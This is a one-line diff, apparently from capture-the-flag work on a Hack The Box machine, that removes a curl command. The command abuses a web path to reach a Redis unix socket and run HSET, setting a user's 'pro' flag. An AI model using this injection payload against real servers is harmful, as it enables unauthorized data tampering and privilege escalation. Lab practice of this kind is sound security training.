@@ -1,1 +1,0 @@
-curl -X HSET "http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:aaa%20pro%20true%20a/b"
